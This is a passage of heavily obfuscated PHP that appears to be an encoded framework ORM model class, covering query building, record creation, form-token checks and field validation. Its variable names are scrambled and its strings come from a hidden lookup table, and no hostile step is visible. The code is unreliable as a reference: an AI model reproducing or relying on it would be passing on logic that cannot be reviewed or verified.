$î¬¡¡Àí[50])) { if (!isset($©Á²àõ¡[$î¬¡¡Àí[301]])) { $©Á²àõ¡[$î¬¡¡Àí[301]] = is_numeric($½ëçÔåş) ? $½ëçÔåş : $î¬¡¡Àí[12]; } $§½œåö… = $this->db->select($©Á²àõ¡); if (!empty($§½œåö…)) { $¨ëùíı† = explode($î¬¡¡Àí[50], $¹ÂØÏ„); $¹ÂØÏ„ = array_keys($§½œåö…[0]); $³ìõ’Ğ = array_shift($¹ÂØÏ„); $­á­–×æ = array_shift($¹ÂØÏ„); $ìŸ¶ıñ = array(); $Ş“ˆ˜§¨ = count($¨ëùíı†); foreach ($§½œåö… as $õ®ıŸÛ) { $òØºĞŠ” = $õ®ıŸÛ[$³ìõ’Ğ]; if (2 == $Ş“ˆ˜§¨) { $ìŸ¶ıñ[$òØºĞŠ”] = $õ®ıŸÛ[$­á­–×æ]; } else { $ìŸ¶ıñ[$òØºĞŠ”] = is_string($½ëçÔåş) ? implode($½ëçÔåş, $õ®ıŸÛ) : $õ®ıŸÛ; } } return $ìŸ¶ıñ; } } else { if (!0 !== $½ëçÔåş) { $©Á²àõ¡[$î¬¡¡Àí[301]] = is_numeric($½ëçÔåş) ? $½ëçÔåş : 1; } if ($½ëçÔåş === $î¬¡¡Àí[264]) { unset($©Á²àõ¡[$î¬¡¡Àí[301]]); } $õ®ıŸÛ = $this->db->select($©Á²àõ¡); if (!empty($õ®ıŸÛ)) { if ($½ëçÔåş === $î¬¡¡Àí[264]) { return reset($õ®ıŸÛ[0]); } if (!0 !== $½ëçÔåş && 1 == $©Á²àõ¡[$î¬¡¡Àí[301]]) { return reset($õ®ıŸÛ[0]); } foreach ($õ®ıŸÛ as $è¶‘­Ä«) { $ÖµÂì±Ç[] = $è¶‘­Ä«[$¹ÂØÏ„]; } return $ÖµÂì±Ç; } } return null; } public function create($Ã‚ š·Í = '', $‡ÁÚºË = '') { $£…«Íá =& $_SERVER[„Ç©ñÎ©]; if (empty($Ã‚ š·Í)) { $Ã‚ š·Í = $_POST; } elseif (is_object($Ã‚ š·Í)) { $Ã‚ š·Í = get_object_vars($Ã‚ š·Í); } if (empty($Ã‚ š·Í) || !is_array($Ã‚ š·Í)) { $this->error = think_lang($£…«Íá[280]); return !1; } $Ã‚ š·Í = $this->parseFieldsMap($Ã‚ š·Í, 0); $‡ÁÚºË = $‡ÁÚºË ? $‡ÁÚºË : (!empty($Ã‚ š·Í[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$£…«Íá[282]])) { $Á¤ˆ§¿¾ = $this->options[$£…«Íá[282]]; unset($this->options[$£…«Íá[282]]); } elseif ($‡ÁÚºË == THINK_MODEL_INSERT && isset($this->insertFields)) { $Á¤ˆ§¿¾ = $this->insertFields; } elseif ($‡ÁÚºË == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Á¤ˆ§¿¾ = $this->updateFields; } if (isset($Á¤ˆ§¿¾)) { if (is_string($Á¤ˆ§¿¾)) { $Á¤ˆ§¿¾ = explode($£…«Íá[50], $Á¤ˆ§¿¾); } if (think_config($£…«Íá[307])) { $Á¤ˆ§¿¾[] = think_config($£…«Íá[308]); } foreach ($Ã‚ š·Í as $‘“­Êı  => $¶¡©š›) { if (!in_array($‘“­Êı , $Á¤ˆ§¿¾)) { unset($Ã‚ š·Í[$‘“­Êı ]); } } } if (!$this->autoValidation($Ã‚ š·Í, $‡ÁÚºË)) { return !1; } if (!$this->autoCheckToken($Ã‚ š·Í)) { $this->error = think_lang($£…«Íá[309]); return !1; } if ($this->autoCheckFields) { $Á¤ˆ§¿¾ = $this->getDbFields(); foreach ($Ã‚ š·Í as $‘“­Êı  => $¶¡©š›) { if (!in_array($‘“­Êı , $Á¤ˆ§¿¾)) { unset($Ã‚ š·Í[$‘“­Êı ]); } elseif (MAGIC_QUOTES_GPC && is_string($¶¡©š›)) { $Ã‚ š·Í[$‘“­Êı ] = stripslashes($¶¡©š›); } } } $this->autoOperation($Ã‚ š·Í, $‡ÁÚºË); $this->data = $Ã‚ š·Í; return $Ã‚ š·Í; } public function autoCheckToken($™ßÆ¥Ïø) { $µÀ‚÷ÀÙ =& $_SERVER[„Ç©ñÎ©]; if (isset($this->options[$µÀ‚÷ÀÙ[310]]) && !$this->options[$µÀ‚÷ÀÙ[310]]) { return !0; } if (think_config($µÀ‚÷ÀÙ[307])) { $îÎƒŠ© = think_config($µÀ‚÷ÀÙ[308]); if (!isset($™ßÆ¥Ïø[$îÎƒŠ©]) || Session::get($îÎƒŠ©)) { return !1; } list($»±Ñûıè, $ºÈø¼—ó) = explode($µÀ‚÷ÀÙ[11], $™ßÆ¥Ïø[$îÎƒŠ©]); if ($ºÈø¼—ó && Session::get($îÎƒŠ© . $µÀ‚÷ÀÙ[10] . $»±Ñûıè) === $ºÈø¼—ó) { Session::remove($îÎƒŠ© . $µÀ‚÷ÀÙ[10] . $»±Ñûıè); return !0; } if (think_config($µÀ‚÷ÀÙ[311])) { Session::remove($îÎƒŠ© . $µÀ‚÷ÀÙ[10] . $»±Ñûıè); } return !1; } return !0; } public function regex($õÀ‰ÇÑ, $›«“Á) { $äÒ‚—² =& $_SERVER[„Ç©ñÎ©]; $€˜¯âë“ = array($äÒ‚—²[312] => $äÒ‚—²[313], $äÒ‚—²[314] => $äÒ‚—²[315], $äÒ‚—²[316] => $äÒ‚—²[317], $äÒ‚—²[318] => $äÒ‚—²[319], $äÒ‚—²[320] => $äÒ‚—²[321], $äÒ‚—²[322] => $äÒ‚—²[323], $äÒ‚—²[324] => $äÒ‚—²[325], $äÒ‚—²[299] => $äÒ‚—²[326], $äÒ‚—²[327] => $äÒ‚—²[328]); if (isset($€˜¯âë“[strtolower($›«“Á)])) { $›«“Á = $€˜¯âë“[strtolower($›«“Á)]; } return preg_match($›«“Á, $õÀ‰ÇÑ) === 1; } private function autoOperation(&$ÃÜ¢Ğ˜Æ, $ë°¢÷—Ô) { $øüÍ¡÷¦ =& $_SERVER[„Ç©ñÎ©]; if (!empty($this->options[$øüÍ¡÷¦[329]])) { $Ñî÷æß = $this->options[$øüÍ¡÷¦[329]]; unset($this->options[$øüÍ¡÷¦[329]]); } elseif (!empty($this->_auto)) { $Ñî÷æß = $this->_auto; } if (isset($Ñî÷æß)) { foreach ($Ñî÷æß as $Í¦†Ã×) { if (empty($Í¦†Ã×[2])) { $Í¦†Ã×[2] = THINK_MODEL_INSERT; } if ($ë°¢÷—Ô == $Í¦†Ã×[2] || $Í¦†Ã×[2] == THINK_MODEL_BOTH) { switch (trim($Í¦†Ã×[3])) { case $øüÍ¡÷¦[330]: case $øüÍ¡÷¦[331]: $¤®–ÈŸø = isset($Í¦†Ã×[4]) ? (array) $Í¦†Ã×[4] : array(); if (isset($ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]])) { array_unshift($¤®–ÈŸø, $ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]]); } if ($øüÍ¡÷¦[330] == $Í¦†Ã×[3]) { $ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]] = call_user_func_array($Í¦†Ã×[1], $¤®–ÈŸø); } else { $ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]] = call_user_func_array(array(&$this, $Í¦†Ã×[1]), $¤®–ÈŸø); } break; case $øüÍ¡÷¦[282]: $ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]] = $ÃÜ¢Ğ˜Æ[$Í¦†Ã×[1]]; break; case $øüÍ¡÷¦[332]: if ($øüÍ¡÷¦[12] === $ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]]) { unset($ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]]); } break; case $øüÍ¡÷¦[333]: default: $ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]] = $Í¦†Ã×[1]; } if (!1 === $ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]]) { unset($ÃÜ¢Ğ˜Æ[$Í¦†Ã×[0]]); } } } } return $ÃÜ¢Ğ˜Æ; } protected function autoValidation($Š¢ŒŒëé, $ñ·ÔŞèé) { $´è®ºŠ÷ =& $_SERVER[„Ç©ñÎ©]; if (!empty($this->options[$´è®ºŠ÷[334]])) { $ÈûÉÛ = $this->options[$´è®ºŠ÷[334]]; unset($this->options[$´è®ºŠ÷[334]]); } elseif (!empty($this->_validate)) { $ÈûÉÛ = $this->_validate; } if (isset($ÈûÉÛ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÈûÉÛ as $“„ÔÊª• => $÷şÆïğñ) { if (empty($÷şÆïğñ[5]) || $÷şÆïğñ[5] == THINK_MODEL_BOTH || $÷şÆïğñ[5] == $ñ·ÔŞèé) { if (0 == strpos($÷şÆïğñ[2], $´è®ºŠ÷[335]) && strpos($÷şÆïğñ[2], $´è®ºŠ÷[336])) { $÷şÆïğñ[2] = think_lang(substr($÷şÆïğñ[2], 2, -1)); } $÷şÆïğñ[3] = isset($÷şÆïğñ[3]) ? $÷şÆïğñ[3] : THINK_EXISTS_VALIDATE; $÷şÆïğñ[4] = isset($÷şÆïğñ[4]) ? $÷şÆïğñ[4] : $´è®ºŠ÷[337]; switch ($÷şÆïğñ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Š¢ŒŒëé, $÷şÆïğñ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($´è®ºŠ÷[12] != trim($Š¢ŒŒëé[$÷şÆïğñ[0]])) { if (!1 === $this->_validationField($Š¢ŒŒëé, $÷şÆïğñ)) { return !1; } } break; default: if (isset($Š¢ŒŒëé[$÷şÆïğñ[0]])) { if (!1 === $this->_validationField($Š¢ŒŒëé, $÷şÆïğñ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ó–ê‚, $ÉÚöÁâ) { if (!1 === $this->_validationFieldItem($ó–ê‚, $ÉÚöÁâ)) { if ($this->patchValidate) { $this->error[$ÉÚöÁâ[0]] = $ÉÚöÁâ[2]; } else { $this->error = $ÉÚöÁâ[2]; return !1; } } return; } protected function _validationFieldItem($…œ”¸Ò”, $Èº¯‘ë) { $‹¶’€º¥ =& $_SERVER[„Ç©ñÎ©]; switch (strtolower(trim($Èº¯‘ë[4]))) { case $‹¶’€º¥[330]: case $‹¶’€º¥[331]: $Ñƒ˜ŒïÛ = isset($Èº¯‘ë[6]) ? (array) $Èº¯‘ë[6] : array(); if (is_string($Èº¯‘ë[0]) && strpos($Èº¯‘ë[0], $‹¶’€º¥[50])) { $Èº¯‘ë[0] = explode($‹¶’€º¥[50], $Èº¯‘ë[0]); } if (is_array($Èº¯‘ë[0])) { foreach ($Èº¯‘ë[0] as $©¡ Ã‘ø) { $”¢·¯Ğœ[$©¡ Ã‘ø] = $…œ”¸Ò”[$©¡ Ã‘ø]; } array_unshift($Ñƒ˜ŒïÛ, $”¢·¯Ğœ); } else { array_unshift($Ñƒ˜ŒïÛ, $…œ”¸Ò”[$Èº¯‘ë[0]]); } if ($‹¶’€º¥[330] == $Èº¯‘ë[4]) { return call_user_func_array($Èº¯‘ë[1], $Ñƒ˜ŒïÛ); } else { return call_user_func_array(array(&$this, $Èº¯‘ë[1]), $Ñƒ˜ŒïÛ); } case $‹¶’€º¥[338]: return $…œ”¸Ò”[$Èº¯‘ë[0]] == $…œ”¸Ò”[$Èº¯‘ë[1]]; case $‹¶’€º¥[339]: if (is_string($Èº¯‘ë[0]) && strpos($Èº¯‘ë[0], $‹¶’€º¥[50])) { $Èº¯‘ë[0] = explode($‹¶’€º¥[50], $Èº¯‘ë[0]); } $£‚êñó× = array(); if (is_array($Èº¯‘ë[0])) { foreach ($Èº¯‘ë[0] as $©¡ Ã‘ø) { $£‚êñó×[$©¡ Ã‘ø] = $…œ”¸Ò”[$©¡ Ã‘ø]; } } else { $£‚êñó×[$Èº¯‘ë[0]] = $…œ”¸Ò”[$Èº¯‘ë[0]]; } if (!empty($…œ”¸Ò”[$this->getPk()])) { $£‚êñó×[$this->getPk()] = array($‹¶’€º¥[340], $…œ”¸Ò”[$this->getPk()]); } if ($this->where($£‚êñó×)->find()) { return !1; } return !0; default: return $this->check($…œ”¸Ò”[$Èº¯‘ë[0]], $Èº¯‘ë[1], $Èº¯‘ë[4]); } } public function check($”« ™×û, $ÏÌììŸ’, $Å®ö‹ê = "\162\x65\147\145\170") { $ÉªıŒ¼  =& $_SERVER[„Ç©ñÎ©]; $Å®ö‹ê = strtolower(trim($Å®ö‹ê)); switch ($Å®ö‹ê) { case $ÉªıŒ¼ [7]: case $ÉªıŒ¼ [341]: $ì¾Å½Òû = is_array($ÏÌììŸ’) ? $ÏÌììŸ’ : explode($ÉªıŒ¼ [50], $ÏÌììŸ’); return $Å®ö‹ê == $ÉªıŒ¼ [7] ? in_array($”« ™×û, $ì¾Å½Òû) : !in_array($”« ™×û, $ì¾Å½Òû); case $ÉªıŒ¼ [342]: case $ÉªıŒ¼ [343]: if (is_array($ÏÌììŸ’)) { $ßÔµ—–‚ = $ÏÌììŸ’[0]; $çµ‚Œ¨ = $ÏÌììŸ’[1]; } else { list($ßÔµ—–‚, $çµ‚Œ¨) = explode($ÉªıŒ¼ [50], $ÏÌììŸ’); } return $Å®ö‹ê == $ÉªıŒ¼ [342] ? $”« ™×û >= $ßÔµ—–‚ && $”« ™×û <= $çµ‚Œ¨ : $”« ™×û < $ßÔµ—–‚ || $”« ™×û > $çµ‚Œ¨; case $ÉªıŒ¼ [344]: case $ÉªıŒ¼ [345]: return $Å®ö‹ê == $ÉªıŒ¼ [344] ? $”« ™×û == $ÏÌììŸ’ : $”« ™×û != $ÏÌììŸ’; case $ÉªıŒ¼ [346]: $×Ã¤çäÆ = mb_strlen($”« ™×û, $ÉªıŒ¼ [347]); if (strpos($ÏÌììŸ’, $ÉªıŒ¼ [50])) { list($ßÔµ—–‚, $çµ‚Œ¨) = explode($ÉªıŒ¼ [50], $ÏÌììŸ’); return $×Ã¤çäÆ >= $ßÔµ—–‚ && $×Ã¤çäÆ <= $çµ‚Œ¨; } else { return $×Ã¤çäÆ == $ÏÌììŸ’; } case $ÉªıŒ¼ [348]: list($Ş–ï„¬ó, $ö‚Ÿ´Øú) = explode($ÉªıŒ¼ [50], $ÏÌììŸ’); if (!is_numeric($Ş–ï„¬ó)) { $Ş–ï„¬ó = strtotime($Ş–ï„¬ó); } if (!is_numeric($ö‚Ÿ´Øú)) { $ö‚Ÿ´Øú = strtotime($ö‚Ÿ´Øú); } return NOW_TIME >= $Ş–ï„¬ó && NOW_TIME <= $ö‚Ÿ´Øú; case $ÉªıŒ¼ [349]: return in_array(get_client_ip(), explode($ÉªıŒ¼ [50], $ÏÌììŸ’)); case $ÉªıŒ¼ [350]: return !in_array(get_client_ip(), explode($ÉªıŒ¼ [50], $ÏÌììŸ’)); case $ÉªıŒ¼ [337]: default: return $this->regex($”« ™×û, $ÏÌììŸ’); } } public function query($†Ÿô»Å¢, $øøóŞ”¥ = false) { $ÜåÖà¼Ë =& $_SERVER[„Ç©ñÎ©]; if (!is_bool($øøóŞ”¥) && !is_array($øøóŞ”¥)) { $øøóŞ”¥ = func_get_args(); array_shift($øøóŞ”¥); } $†Ÿô»Å¢ = str_replace(array($ÜåÖà¼Ë[66], $ÜåÖà¼Ë[351]), $ÜåÖà¼Ë[53], $†Ÿô»Å¢); $†Ÿô»Å¢ = $this->parseSql($†Ÿô»Å¢, $øøóŞ”¥); return $this->db->query($†Ÿô»Å¢); } public function execute($ªÃÉêµÀ, $Ó™ş÷œ = false) { if (!is_bool($Ó™ş÷œ) && !is_array($Ó™ş÷œ)) { $Ó™ş÷œ = func_get_args(); array_shift($Ó™ş÷œ); } $ªÃÉêµÀ = $this->parseSql($ªÃÉêµÀ, $Ó™ş÷œ); return $this->db->execute($ªÃÉêµÀ); } protected function parseSql($ç‹‚, $İ®§…ö) { $Ÿ—½¸ =& $_SERVER[„Ç©ñÎ©]; if (!0 === $İ®§…ö) { $ì©•àÌ = $this->_parseOptions(); $ç‹‚ = $this->db->parseSql($ç‹‚, $ì©•àÌ); } elseif (is_array($İ®§…ö)) { $İ®§…ö = array_map(array($this->db, $Ÿ—½¸[352]), $İ®§…ö); $ç‹‚ = vsprintf($ç‹‚, $İ®§…ö); } else { $ç‹‚ = strtr($ç‹‚, array($Ÿ—½¸[353] => $this->getTableName(), $Ÿ—½¸[354] => think_config($Ÿ—½¸[253]))); } $this->db->setModel($this->name); return $ç‹‚; } public function db($ï±· = '', $‰†Ï¾¥ = '', $™×½Ú– = array()) { $òõÛÕÎ“ =& $_SERVER[„Ç©ñÎ©]; if ($òõÛÕÎ“[12] === $ï±· && $this->db) { return $this->db; } static $×ß«¦Á” = array(); static $·•œä  = array(); if (!isset($·•œä [$ï±·]) || isset($·•œä [$ï±·]) && $‰†Ï¾¥ && $×ß«¦Á”[$ï±·] != $‰†Ï¾¥) { if (!empty($‰†Ï¾¥) && is_string($‰†Ï¾¥) && !1 === strpos($‰†Ï¾¥, $òõÛÕÎ“[8])) { $‰†Ï¾¥ = think_config($‰†Ï¾¥); } $ï±· = think_guid($‰†Ï¾¥); $·•œä [$ï±·] = Db::getInstance($‰†Ï¾¥); } elseif (NULL === $‰†Ï¾¥) { $·•œä [$ï±·]->close(); unset($·•œä [$ï±·]); return; } if (!empty($™×½Ú–)) { if (is_string($™×½Ú–)) { parse_str($™×½Ú–, $™×½Ú–); } foreach ($™×½Ú– as $÷ÖøÖ ı => $–ÛÔÁ£) { $this->setProperty($÷ÖøÖ ı, $–ÛÔÁ£); } } $×ß«¦Á”[$ï±·] = $‰†Ï¾¥; $this->db = $·•œä [$ï±·]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ §İË¨¹ = get_class($this); if ($ §İË¨¹ == $_SERVER[„Ç©ñÎ©][355]) { return $this->name; } $this->name = substr($ §İË¨¹, 0, -5); } return $this->name; } public function getTableName() { $á©Œˆ˜ =& $_SERVER[„Ç©ñÎ©]; if (empty($this->trueTableName)) { $Ç†¬Á¯æ = !empty($this->tablePrefix) ? $this->tablePrefix : $á©Œˆ˜[12]; if (!empty($this->tableName)) { $Ç†¬Á¯æ .= $this->tableName; } else { $Ç†¬Á¯æ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ç†¬Á¯æ); } return (!empty($this->dbName) ? $this->dbName . $á©Œˆ˜[10] : $á©Œˆ˜[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ëá¢û =& $_SERVER[„Ç©ñÎ©]; return isset($this->fields[$Ëá¢û[260]]) ? $this->fields[$Ëá¢û[260]] : $this->pk; } public function getDbFields() { $ÆÃï¡¦ =& $_SERVER[„Ç©ñÎ©]; if (isset($this->options[$ÆÃï¡¦[288]])) { $™¥ß³ŸØ = $this->db->getFields($this->options[$ÆÃï¡¦[288]]); return $™¥ß³ŸØ ? array_keys($™¥ß³ŸØ) : !1; } if ($this->fields) { $™¥ß³ŸØ = $this->fields; unset($™¥ß³ŸØ[$ÆÃï¡¦[259]], $™¥ß³ŸØ[$ÆÃï¡¦[260]], $™¥ß³ŸØ[$ÆÃï¡¦[261]], $™¥ß³ŸØ[$ÆÃï¡¦[258]]); return $™¥ß³ŸØ; } return !1; } public function data($†ˆ¡çè¦ = '') { $˜¾ÑÃÀñ =& $_SERVER[„Ç©ñÎ©]; if ($˜¾ÑÃÀñ[12] === $†ˆ¡çè¦ && !empty($this->data)) { return $this->data; } if (is_object($†ˆ¡çè¦)) { $†ˆ¡çè¦ = get_object_vars($†ˆ¡çè¦); } elseif (is_string($†ˆ¡çè¦)) { parse_str($†ˆ¡çè¦, $†ˆ¡çè¦); } elseif (!is_array($†ˆ¡çè¦)) { think_exception(think_lang($˜¾ÑÃÀñ[280])); } $this->data = $†ˆ¡çè¦; return $this; } public function join($¼§ÌÑê½) { $²óİòÊ =& $_SERVER[„Ç©ñÎ©]; if (is_array($¼§ÌÑê½)) { $this->options[$²óİòÊ[291]] = $¼§ÌÑê½; } elseif (!empty($¼§ÌÑê½)) { $this->options[$²óİòÊ[291]][] = $¼§ÌÑê½; } return $this; } public function union($¯¤ûô–‹, $èõ—·ô = false) { $÷ôõó·¸ =& $_SERVER[„Ç©ñÎ©]; if (empty($¯¤ûô–‹)) { return $this; } if ($èõ—·ô) { $this->options[$÷ôõó·¸[356]][$÷ôõó·¸[357]] = !0; } if (is_object($¯¤ûô–‹)) { $¯¤ûô–‹ = get_object_vars($¯¤ûô–‹); } if (is_string($¯¤ûô–‹)) { $¥¨šËÀ¸ = $¯¤ûô–‹; } elseif (is_array($¯¤ûô–‹)) { if (isset($¯¤ûô–‹[0])) { $this->options[$÷ôõó·¸[356]] = array_merge($this->options[$÷ôõó·¸[356]], $¯¤ûô–‹); return $this; } else { $¥¨šËÀ¸ = $¯¤ûô–‹; } } else { think_exception(think_lang($÷ôõó·¸[280])); } $this->options[$÷ôõó·¸[356]][] = $¥¨šËÀ¸; return $this; } public function cache($…íö´ûì = true, $Æ«‰›òï = null, $Îş¯ÇÅİ = '') { $†ŸĞ•ô =& $_SERVER[„Ç©ñÎ©]; if (!1 !== $…íö´ûì) { $this->options[$†ŸĞ•ô[358]] = array($†ŸĞ•ô[104] => $…íö´ûì, $†ŸĞ•ô[348] => $Æ«‰›òï, $†ŸĞ•ô[33] => $Îş¯ÇÅİ); } return $this; } public function field($Ú‘®æ¨±, $çÈÈ§Ï¾ = false) { $ç¨óÀ»ù =& $_SERVER[„Ç©ñÎ©]; if (!0 === $Ú‘®æ¨±) { $ĞëÇ£ = $this->getDbFields(); $Ú‘®æ¨± = $ĞëÇ£ ? $ĞëÇ£ : $ç¨óÀ»ù[198]; } elseif ($çÈÈ§Ï¾) { if (is_string($Ú‘®æ¨±)) { $Ú‘®æ¨± = explode($ç¨óÀ»ù[50], $Ú‘®æ¨±); } $ĞëÇ£ = $this->getDbFields(); $Ú‘®æ¨± = $ĞëÇ£ ? array_diff($ĞëÇ£, $Ú‘®æ¨±) : $Ú‘®æ¨±; } $this->options[$ç¨óÀ»ù[282]] = $Ú‘®æ¨±; return $this; } public function scope($Ê¬ü¼£ = '', $»Ö¦±Úø = NULL) { $ëıõ•îÖ =& $_SERVER[„Ç©ñÎ©]; if ($ëıõ•îÖ[12] === $Ê¬ü¼£) { if (isset($this->_scope[$ëıõ•îÖ[37]])) { $õ˜¼¶… = $this->_scope[$ëıõ•îÖ[37]]; } else { return $this; } } elseif (is_string($Ê¬ü¼£)) { $Ö²Åıß‰ = explode($ëıõ•îÖ[50], $Ê¬ü¼£); $õ˜¼¶… = array(); foreach ($Ö²Åıß‰ as $µ’Ÿ˜ŸÒ) { if (!isset($this->_scope[$µ’Ÿ˜ŸÒ])) { continue; } $õ˜¼¶… = array_merge($õ˜¼¶…, $this->_scope[$µ’Ÿ˜ŸÒ]); } if (!empty($»Ö¦±Úø) && is_array($»Ö¦±Úø)) { $õ˜¼¶… = array_merge($õ˜¼¶…, $»Ö¦±Úø); } } elseif (is_array($Ê¬ü¼£)) { $õ˜¼¶… = $Ê¬ü¼£; } if (is_array($õ˜¼¶…) && !empty($õ˜¼¶…)) { $this->options = array_merge($this->options, array_change_key_case($õ˜¼¶…)); } return $this; } public function where($×É¸•£, $îé¶¯áÇ = null) { $ã†š¿²‰ =& $_SERVER[„Ç©ñÎ©]; if (!is_null($îé¶¯áÇ) && is_string($×É¸•£)) { if (!is_array($îé¶¯áÇ)) { $îé¶¯áÇ = func_get_args(); array_shift($îé¶¯áÇ); } $îé¶¯áÇ = array_map(array($this->db, $ã†š¿²‰[352]), $îé¶¯áÇ); $×É¸•£ = vsprintf($×É¸•£, $îé¶¯áÇ); } elseif (is_object($×É¸•£)) { $×É¸•£ = get_object_vars($×É¸•£); } elseif (is_array($×É¸•£)) { foreach ($×É¸•£ as $øı¥÷çµ => $˜ÔÚ×âé) { if ((is_numeric($øı¥÷çµ) || !$øı¥÷çµ) && is_string($˜ÔÚ×âé)) { if (strpos($˜ÔÚ×âé, $ã†š¿²‰[359]) === 0) { continue; } think_trace($ã†š¿²‰[360], $ã†š¿²‰[12], $ã†š¿²‰[49]); die; } } } if (is_string($×É¸•£) && $ã†š¿²‰[12] != $×É¸•£) { $Ù«ú¹Êâ = array(); $Ù«ú¹Êâ[$ã†š¿²‰[361]] = $×É¸•£; $×É¸•£ = $Ù«ú¹Êâ; } if (isset($this->options[$ã†š¿²‰[284]])) { $this->options[$ã†š¿²‰[284]] = array_merge($this->options[$ã†š¿²‰[284]], $×É¸•£); } else { $this->options[$ã†š¿²‰[284]] = $×É¸•£; } return $this; } public function limit($È³¥†Ô£, $§Á¯Ñ…ï = null) { $ì­†‡¿» =& $_SERVER[„Ç©ñÎ©]; $this->options[$ì­†‡¿»[301]] = is_null($§Á¯Ñ…ï) ? $È³¥†Ô£ : $È³¥†Ô£ . $ì­†‡¿»[50] . $§Á¯Ñ…ï; return $this; } public function page($ğÀğÆŞ·, $ñ§›ß¤µ = null) { $ƒä¯ÜÂÕ =& $_SERVER[„Ç©ñÎ©]; $this->options[$ƒä¯ÜÂÕ[362]] = is_null($ñ§›ß¤µ) ? $ğÀğÆŞ· : $ğÀğÆŞ· . $ƒä¯ÜÂÕ[50] . $ñ§›ß¤µ; return $this; } public function comment($·Ÿ³¢Ë) { $this->options[$_SERVER[„Ç©ñÎ©][363]] = $·Ÿ³¢Ë; return $this; } public function setProperty($éÂãª—ì, $ø—ãÛ¾) { if (property_exists($this, $éÂãª—ì)) { $this->{$éÂãª—ì} = $ø—ãÛ¾; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\146\171\124\151\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\x65\162\x74\54\165\160\x64\x61\164\x65", "\x66\165\x6e\143\x74\x69\157\x6e"), array("\x63\x72\x65\x61\164\145\x54\151\x6d\145", "\164\151\155\145", "\151\x6e\x73\145\x72\x74", "\146\165\x6e\x63\x74\151\157\156")); public function setDataAuto($ÛÖ¥û„ˆ) { $this->dataAuto = $ÛÖ¥û„ˆ; } public function __construct($ÙÙİÑ­ = '', $•…Ó¡ÆÀ = '', $ğñÅ © = '') { parent::__construct($ÙÙİÑ­, $•…Ó¡ÆÀ, $ğñÅ ©); } protected $tableMeta = array(); protected function _beforeInsert(&$§ìšª½Â, $ö¬†ò‹) { $Ò®³¢Í =& $_SERVER[„Ç©ñÎ©]; if (!$this->checkDataAutoHas($Ò®³¢Í[364])) { return; } $this->dataBeforeFilter($§ìšª½Â, $Ò®³¢Í[364]); } protected function _beforeUpdate(&$³•øËœÈ, $Ó¹Íö’ğ) { $õ²íÀá£ =& $_SERVER[„Ç©ñÎ©]; if (!$this->checkDataAutoHas($õ²íÀá£[365])) { return; } $this->dataBeforeFilter($³•øËœÈ, $õ²íÀá£[365]); } protected function _afterSelect(&$äã˜«‘€, $£µÄ˜—Ğ) { if (!is_array($äã˜«‘€)) { return; } if (!$this->checkDataAutoHas($_SERVER[„Ç©ñÎ©][366])) { return; } foreach ($äã˜«‘€ as &$äÅÖ‹±¦) { $this->dataAfterFilter($äÅÖ‹±¦); } unset($äÅÖ‹±¦); } protected function _afterFind(&$Ó«§…Ïª, $ß†–äëË) { if (!is_array($Ó«§…Ïª)) { return; } if (!$this->checkDataAutoHas($_SERVER[„Ç©ñÎ©][366])) { return; } $this->dataAfterFilter($Ó«§…Ïª); } public static function textEncode($òëáâ) { if (!$òëáâ) { return $òëáâ; } $ÌÀ™ÎÇ = json_encode($òëáâ); $ÌÀ™ÎÇ = preg_replace_callback($_SERVER[„Ç©ñÎ©][367], function ($çğµ‘á˜) { return addslashes($çğµ‘á˜[0]); }, $ÌÀ™ÎÇ); return json_decode($ÌÀ™ÎÇ); } public static function textDecode($ŠœãşÑ) { $‹›ã¬Áå =& $_SERVER[„Ç©ñÎ©]; $¦Œíó¶á = json_encode($ŠœãşÑ); $¦Œíó¶á = preg_replace_callback($‹›ã¬Áå[368], function ($·Çõš¯‹) { return $_SERVER[„Ç©ñÎ©][107]; }, $¦Œíó¶á); return json_decode($¦Œíó¶á); } public function setAutoIncrement($¾ÆèÆø) { $ô–¯ÑÍ = array($this->getPk() => $¾ÆèÆø); $¼®ª²Şı = $this->data($ô–¯ÑÍ)->add(); if ($¼®ª²Şı) { $this->delete($¼®ª²Şı); } } public function getAutoIncrement() { $ŠÒÁæÁ = $this->getTableName(); $‡òú©¤© = $this->max($this->getPk()); $éÉŸ¼ã = $this->query("\x73\150\x6f\x77\x20\164\x61\142\x6c\145\40\x73\x74\x61\x74\x75\163\40\x77\x68\x65\x72\145\x20\116\141\155\145\x3d\47{$ŠÒÁæÁ}\x27"); $á­¸¤Ë‹ = $éÉŸ¼ã[0][$_SERVER[„Ç©ñÎ©][369]]; $¢õ¹ï’Ò = max($‡òú©¤©, $á­¸¤Ë‹); return $¢õ¹ï’Ò; } protected function _callBefore($şÍŞ±Ë†, $”±ÜŠÏı) { return $this->cacheCallCheck($şÍŞ±Ë†, $”±ÜŠÏı, !1); } protected function _callAfter($£Ó÷êÌÊ, $Å¿ÓÁ¾) { return $this->cacheCallCheck($£Ó÷êÌÊ, $Å¿ÓÁ¾, !0); } protected function cacheFunctionAlias($ÓÕßİ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function 